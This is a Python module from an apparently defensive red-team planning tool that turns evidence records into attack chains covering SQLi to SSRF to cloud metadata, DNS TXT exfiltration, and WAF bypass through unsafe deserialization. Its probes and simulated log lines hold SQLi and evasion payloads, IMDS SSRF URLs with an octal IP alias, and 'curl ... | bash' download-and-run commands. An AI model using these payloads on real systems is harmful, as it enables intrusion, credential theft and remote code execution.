"""Red attack tracks for AppSec chains, DNS TXT tunneling, and WAF/deserialization bypass."""

from __future__ import annotations

from typing import List

from hermes_cyber.models import RedProbe
from hermes_cyber.observer import is_record_correlated_with_any, is_routine_dns_txt_record
from hermes_cyber.red_claims import (
    RedPlanBuilder,
    _collect_subject_entities,
    _format_observed_fact,
    _group_records_by_host,
    _has_any,
    _infer_claim_priority,
)


def run_track1_code_ssrf(b: RedPlanBuilder) -> None:
    """Track 1: Multi-Hop Code / IaC SQLi -> Unmitigated SSRF -> IMDS -> Container Escape."""
    threat_evs = b.threat_evs
    ev_by_id = b.ev_by_id
    all_raw = b.all_raw

    sql_evs = [
        e.evidence_id
        for e in threat_evs
        if "sql_concat" in e.entities.get("sinks", []) or "union select" in e.raw_content.lower()
    ]
    ssrf_evs = [
        e.evidence_id
        for e in threat_evs
        if (
            ("ssrf_fetch" in e.entities.get("sinks", []) and "url_allowlist" not in e.entities.get("controls", []))
            or "169.254.169.254" in e.raw_content
        )
    ]
    priv_evs = [
        e.evidence_id
        for e in threat_evs
        if "container_priv" in e.entities.get("sinks", []) or "privileged: true" in e.raw_content.lower()
    ]

    if not ((sql_evs and ssrf_evs) or "169.254.169.254" in all_raw):
        return

    ep = next((ep for ev in threat_evs for ep in ev.entities.get("endpoints", [])), "/api/v1/export")
    has_live_probe = "169.254.169.254" in all_raw or "union+select" in all_raw.lower()
    has_route = any(ep_item.startswith("/") for ev in threat_evs for ep_item in ev.entities.get("endpoints", []))
    if sql_evs:
        sql_missing: List[str] = []
        if not (has_route or has_live_probe):
            sql_missing.append("No external HTTP entrypoint or unvalidated caller parameter is shown reaching the SQL concatenation.")
        b.add_step_and_claim(
            tactic="Initial Access",
            technique_id="T1190",
            technique_name="Exploit Public-Facing Application (SQLi -> SSRF Pivot)",
            observed_fact=_format_observed_fact(ev_by_id, sql_evs, f"Dynamic SQL string construction observed at `{ep}`:"),
            proposed_interpretation="String concatenation in SQL filter lets attacker inject controlled webhook URL or extract DB records.",
            evidence_ids=sql_evs,
            reachability_proof=f"Route `{ep}` concatenates parameter directly into SQL string.",
            missing_conditions=sql_missing,
            confirming_or_refuting_proof=f"Send safe boolean canary on `{ep}` or verify parameterized bindings replace string interpolation.",
        )
    if ssrf_evs:
        ssrf_missing: List[str] = []
        if not (has_route or has_live_probe or sql_evs):
            ssrf_missing.append("Lack of URL allowlist and reachability from untrusted caller input are not yet verified.")
        b.add_step_and_claim(
            tactic="Credential Access",
            technique_id="T1552.005",
            technique_name="Cloud Instance Metadata API (SSRF)",
            observed_fact=_format_observed_fact(ev_by_id, ssrf_evs, "Unvalidated outbound HTTP fetch / IMDS reference observed:"),
            proposed_interpretation="Unvalidated URL fetch allows pivoting directly to cloud IMDS endpoint (169.254.169.254) for IAM tokens.",
            evidence_ids=ssrf_evs,
            reachability_proof="Function parameter flows directly into `requests.get(...)` without CIDR/host allowlist.",
            missing_conditions=ssrf_missing,
            confirming_or_refuting_proof="Confirm non-RFC1918/IMDS URL allowlist enforcement and redirect blocking on outbound HTTP call.",
        )
    if priv_evs:
        b.add_step_and_claim(
            tactic="Privilege Escalation",
            technique_id="T1611",
            technique_name="Escape to Host via Privileged Container",
            observed_fact=_format_observed_fact(ev_by_id, priv_evs, "Container deployment sets privileged security context:"),
            proposed_interpretation="Privileged pod security context amplifies SSRF/RCE compromise to node-level host breakout.",
            evidence_ids=priv_evs,
            reachability_proof="Deployment manifest explicitly sets `privileged: true` and `allowPrivilegeEscalation: true`.",
            missing_conditions=[],
            confirming_or_refuting_proof="Inspect live Kubernetes PodSecurity spec for `privileged: false` and dropped capabilities.",
        )
    b.probes.append(RedProbe(
        probe_id=b.next_probe_id(),
        title="Non-destructive SQLi + Loopback SSRF Reachability Check",
        target_surface=ep,
        method_or_vector="HTTP GET safe-canary probe",
        payload_or_command=f"GET {ep}?tenant_id=1'+AND+'1'='1&webhook_url=http://169.254.169.254/latest/meta-data/",
        expected_ioc="200 OK with metadata key names or SQL parser syntax delta in response",
    ))
    b.add_sim(
        variant="baseline_attack",
        log_line=f'src=198.51.100.88 method=GET {ep}?tenant_id=%27+UNION+SELECT+1&webhook_url=http://169.254.169.254/latest/meta-data/ status=200',
        mitre_technique_id="T1190",
    )
    b.add_sim(
        variant="evasion_variant",
        log_line=f'src=198.51.100.89 method=GET {ep}?tenant_id=1%2f**%2fuNiOn%2f**%2fsElEcT&webhook_url=http://0251.0376.0251.0376/latest/meta-data/ status=200',
        mitre_technique_id="T1552.005",
    )
    b.blind_spots.append("Simple regex blocks on `169.254.169.254` fail against octal/decimal IP aliases (0251.0376.0251.0376) and `UNION` SQL comment evasion.")
    b.hypotheses.append("Exploitable Multi-Hop Chain: SQL Injection feeding Cloud Metadata SSRF in a Privileged Pod.")
    b.confidences.append(0.92)


def run_track2_dns_exfil(b: RedPlanBuilder) -> None:
    """Track 2: DNS TXT Tunneling / Token Leak + Encoded Execution (scoped entity & time window)."""
    threat_evs = b.threat_evs
    ev_by_id = b.ev_by_id
    covered_eids = b.covered_eids

    dns_exec_evs = [
        e.evidence_id
        for e in threat_evs
        if e.evidence_id not in covered_eids and _has_any(e.raw_content, ("powershell", "pwsh", "child_of="))
    ]
    token_evs = [
        e.evidence_id
        for e in threat_evs
        if e.evidence_id not in covered_eids and _has_any(e.raw_content, ("token_leak",))
    ]
    active_stage_recs = [ev_by_id[eid] for eid in [*dns_exec_evs, *token_evs] if eid in ev_by_id]
    dns_evs = [
        e.evidence_id
        for e in threat_evs
        if e.evidence_id not in covered_eids
        and _has_any(e.raw_content, ("qtype=txt", "c2-sync", "txt query"))
        and (
            not is_routine_dns_txt_record(e)
            or is_record_correlated_with_any(e, active_stage_recs, threat_evs)
        )
    ]
    if not (dns_evs or token_evs):
        return

    dns_subj = _collect_subject_entities(ev_by_id, [*token_evs, *dns_exec_evs, *dns_evs])
    dns_only_subj = _collect_subject_entities(ev_by_id, dns_evs) if dns_evs else dns_subj
    tok_subj = _collect_subject_entities(ev_by_id, token_evs) if token_evs else dns_subj
    exec_subj = _collect_subject_entities(ev_by_id, dns_exec_evs) if dns_exec_evs else dns_subj
    host_lbl = (dns_only_subj["hosts"] or dns_subj["hosts"] or ["db-core-02"])[0]
    tok_host_lbl = (tok_subj["hosts"] or [host_lbl])[0]
    exec_host_lbl = (exec_subj["hosts"] or [host_lbl])[0]
    src_ip = (dns_only_subj["ips"] or dns_subj["ips"] or ["10.10.4.22"])[0]
    proc_lbl = (exec_subj["processes"] or dns_subj["processes"] or ["powershell.exe"])[0]

    dns_recs = [ev_by_id[eid] for eid in dns_evs if eid in ev_by_id]
    corr_exec_evs = [
        eid for eid in dns_exec_evs
        if is_record_correlated_with_any(ev_by_id[eid], dns_recs, threat_evs)
    ] if dns_recs else []
    corr_token_evs = [
        eid for eid in token_evs
        if is_record_correlated_with_any(ev_by_id[eid], dns_recs, threat_evs)
    ] if dns_recs else []
    policy_recs = [
        e for e in threat_evs
        if _has_any(e.raw_content, ("dns_txt_authorized=false", "maintenance_window=false"))
    ]
    has_dns_policy_breach = any(
        is_record_correlated_with_any(p, dns_recs, threat_evs)
        for p in policy_recs
    ) if dns_recs else False

    has_dns_process = any(
        ev_by_id[eid].entities.get("processes") or "child_of=" in ev_by_id[eid].raw_content.lower()
        for eid in dns_evs
    ) or bool(corr_exec_evs)
    has_dns_vol_entropy = (
        any(_has_any(ev_by_id[eid].raw_content, ("entropy=", "bytes=", "rate=", "c2-sync")) for eid in dns_evs)
        or len(dns_evs) >= 2
    )

    dns_missing: List[str] = []
    if not has_dns_vol_entropy:
        dns_missing.append("Query volume, frequency, and TXT payload entropy/content are unknown.")
    if not has_dns_process:
        dns_missing.append("Originating process lineage is not identified.")
    if not (corr_token_evs or corr_exec_evs or has_dns_policy_breach):
        dns_missing.append("No correlation with credential access, execution, or policy violation in the same time window.")

    if token_evs:
        b.add_step_and_claim(
            tactic="Credential Access",
            technique_id="T1528",
            technique_name="Steal Application Access Token",
            observed_fact=_format_observed_fact(ev_by_id, token_evs, f"Credential/token leak telemetry recorded on `{tok_host_lbl}`:"),
            proposed_interpretation=f"Leaked bearer credential on `{tok_host_lbl}` grants authenticated pivot capability on database/ETL tier.",
            evidence_ids=token_evs,
            reachability_proof="Raw token exposure event observed on internal service host prior to execution.",
            missing_conditions=[],
            confirming_or_refuting_proof="Rotate exposed credential and audit subsequent token usage across auth logs.",
        )
    if dns_exec_evs:
        b.add_step_and_claim(
            tactic="Execution",
            technique_id="T1059.001",
            technique_name="Command and Scripting Interpreter (Encoded PowerShell)",
            observed_fact=_format_observed_fact(ev_by_id, dns_exec_evs, f"Encoded command execution observed on `{exec_host_lbl}`:"),
            proposed_interpretation=f"Worker process spawned `{proc_lbl}` obfuscating staging collector on `{exec_host_lbl}`.",
            evidence_ids=dns_exec_evs,
            reachability_proof=f"Process lineage execution event observed on `{exec_host_lbl}`.",
            missing_conditions=[],
            confirming_or_refuting_proof=f"Decode encoded script argument and verify parent-child process tree on `{exec_host_lbl}`.",
        )
    if dns_evs:
        b.add_step_and_claim(
            tactic="Exfiltration",
            technique_id="T1048.003",
            technique_name="Exfiltration Over Alternative Protocol (DNS TXT)",
            observed_fact=_format_observed_fact(ev_by_id, dns_evs, "Observed DNS TXT query activity:"),
            proposed_interpretation="DNS TXT queries may represent covert C2 or data exfiltration channel bypassing HTTP proxy inspection.",
            evidence_ids=dns_evs,
            reachability_proof=(
                "Correlated high-entropy/unauthorized TXT queries with execution & token leak."
                if not dns_missing
                else "Single/partial TXT query observed without correlated volume, lineage, or authorization evidence."
            ),
            missing_conditions=dns_missing,
            confirming_or_refuting_proof="Correlate DNS TXT queries with the originating process, volume/entropy metrics, and suspicious timeframe activity.",
        )
    elif b.claims and not dns_exec_evs:
        b.claims[-1].missing_conditions.append("Post-exposure lateral movement or data egress from leaked credential is not yet observed.")
        b.claims[-1].status = "open"
        p_val, p_rat = _infer_claim_priority(b.claims[-1].missing_conditions, b.claims[-1].tactic, b.claims[-1].technique_id)
        b.claims[-1].priority = p_val  # type: ignore[assignment]
        b.claims[-1].priority_rationale = p_rat
        b.kill_chain[-1].missing_conditions = list(b.claims[-1].missing_conditions)
        b.kill_chain[-1].status = "open"

    b.probes.append(RedProbe(
        probe_id=b.next_probe_id(),
        title="Egress DNS TXT Tunneling & Process Lineage Verification",
        target_surface=f"{host_lbl} egress resolver + child processes",
        method_or_vector="Canary TXT DNS lookup audit + parent-child process query",
        payload_or_command="dig +short TXT canaryprobe01.exfil.c2-sync.example.net @resolver",
        expected_ioc="DNS firewall alert triggered on unauthorized TXT entropy > 4.2 or worker->shell fork",
    ))
    b.add_sim(
        variant="baseline_attack",
        log_line=f'dns_src={src_ip} qtype=TXT query="JBSWY3DPEBLW64TMMQ.exfil.c2-sync.example.net" proc={proc_lbl} cmd="{proc_lbl} -enc SQBFAFgA" entropy=4.9',
        mitre_technique_id="T1048.003",
    )
    b.add_sim(
        variant="evasion_variant",
        log_line=f'dns_src={src_ip} qtype=CNAME query="a1b2c3d4e5.sync.c2-sync.example.net" proc=pwsh cmd="pwsh -EncodedCommand QQBiAEM=" entropy=4.7',
        mitre_technique_id="T1048.003",
    )
    b.blind_spots.append("SOC threshold alerts focus on HTTP floods while low-rate DNS TXT/CNAME egress runs unnoticed.")
    if dns_missing:
        b.hypotheses.append(f"Open Hypothesis on `{host_lbl}`: DNS TXT query could be exfiltration, pending volume, process lineage, and window correlation.")
        b.confidences.append(0.45)
    else:
        b.hypotheses.append(f"Active Multi-Stage Intrusion on `{host_lbl}`: Token theft, encoded execution, and DNS C2 exfiltration.")
        b.confidences.append(0.90)


def run_track2b_waf_deser(b: RedPlanBuilder) -> None:
    """Track 2b: WAF Bypass / Unsafe Deserialization / Shell Reverse Staging (scoped by host)."""
    threat_evs = b.threat_evs
    ev_by_id = b.ev_by_id
    all_raw = b.all_raw
    covered_eids = b.covered_eids

    waf_recs = [
        e
        for e in threat_evs
        if e.evidence_id not in covered_eids and _has_any(e.raw_content, ("pickle.loads", "waf_status=allowed", "sh -c"))
    ]
    if not waf_recs:
        return

    for host_key, h_recs in _group_records_by_host(waf_recs):
        grp_subj = _collect_subject_entities(ev_by_id, [r.evidence_id for r in h_recs])
        grp_hosts = set(grp_subj["hosts"])
        grp_ips = set(grp_subj["ips"])
        grp_eps = set(grp_subj["endpoints"])

        scoped_recs = list(h_recs)
        for e in threat_evs:
            if e in scoped_recs or e.evidence_id in covered_eids:
                continue
            if _has_any(e.raw_content, ("waf_status=allowed", "pickle.loads", "sh -c", "payload_b64=", "egress_dst=")) and (
                (grp_hosts and set(e.entities.get("hosts", [])) & grp_hosts)
                or (grp_ips and set(e.entities.get("ips", [])) & grp_ips)
                or (grp_eps and set(e.entities.get("endpoints", [])) & grp_eps)
            ):
                scoped_recs.append(e)

        deser_ids = [e.evidence_id for e in scoped_recs if _has_any(e.raw_content, ("waf_status=allowed", "pickle.loads", "payload_b64="))]
        shell_ids = [e.evidence_id for e in scoped_recs if _has_any(e.raw_content, ("sh -c", "curl ", "egress_dst="))]
        all_grp_ids = list(dict.fromkeys([e.evidence_id for e in scoped_recs]))
        final_subj = _collect_subject_entities(ev_by_id, all_grp_ids)
        host_lbl = host_key or (final_subj["hosts"] or ["web-api-03"])[0]
        ep = (final_subj["endpoints"] or ["/api/v2/session/restore"])[0]
        proc_lbl = (final_subj["processes"] or ["python3"])[0]

        if deser_ids:
            b.add_step_and_claim(
                tactic="Defense Evasion",
                technique_id="T1190",
                technique_name="WAF Header Smuggling / Unsafe Deserialization",
                observed_fact=_format_observed_fact(ev_by_id, deser_ids, f"Unsafe deserialization / WAF bypass observed on `{host_lbl}`:"),
                proposed_interpretation=f"Serialized payload on `{ep}` bypasses query-only WAF rules and triggers unsafe object deserialization.",
                evidence_ids=deser_ids,
                reachability_proof=f"Header/body deserialization reaches `pickle.loads` on `{ep}`.",
                missing_conditions=[] if (shell_ids or "pickle.loads" in all_raw.lower()) else ["Serialized payload decoding into execution sink is not confirmed."],
                confirming_or_refuting_proof=f"Send malformed non-exec JSON/base64 canary to `{ep}` and confirm rejection before deserialization.",
            )
        if shell_ids:
            b.add_step_and_claim(
                tactic="Execution",
                technique_id="T1059.004",
                technique_name="Unix Shell Reverse Staging (`sh -c`)",
                observed_fact=_format_observed_fact(ev_by_id, shell_ids, f"Unexpected shell command execution observed on `{host_lbl}`:"),
                proposed_interpretation=f"Application worker `{proc_lbl}` spawned OS shell command with external egress on `{host_lbl}`.",
                evidence_ids=shell_ids,
                reachability_proof=f"Process telemetry confirms worker `{proc_lbl}` forked shell execution on `{host_lbl}`.",
                missing_conditions=[],
                confirming_or_refuting_proof=f"Audit `{proc_lbl} -> sh` fork events and outbound egress ACL on `{host_lbl}`.",
            )
        b.probes.append(RedProbe(
            probe_id=b.next_probe_id(),
            title="Header Deserialization Boundary Verification",
            target_surface=f"{host_lbl} {ep}",
            method_or_vector="POST malformed non-exec JSON/base64 probe",
            payload_or_command=f"POST {ep} X-Token-Fmt: base64 body=e30=",
            expected_ioc="Endpoint rejects with 400 JSON-only error rather than invoking unsafe deserialization",
        ))
        b.add_sim(
            variant="baseline_attack",
            log_line=f'host={host_lbl} method=POST {ep} proc=sh cmd="sh -c curl http://91.132.147.18/s.sh | bash" pickle.loads',
            mitre_technique_id="T1059.004",
        )
        b.add_sim(
            variant="evasion_variant",
            log_line=f'host={host_lbl} method=POST {ep} proc=dash cmd="/bin/sh -c wget -qO- http://91.132.147.18/s.sh" parent_proc={proc_lbl}',
            mitre_technique_id="T1059.004",
        )
        b.blind_spots.append("Edge WAF inspects only URL query parameters, ignoring serialized Base64 blobs and worker->shell forks.")
        b.hypotheses.append(f"WAF Bypass & Remote Code Execution on `{host_lbl}`.")
        b.confidences.append(0.91)
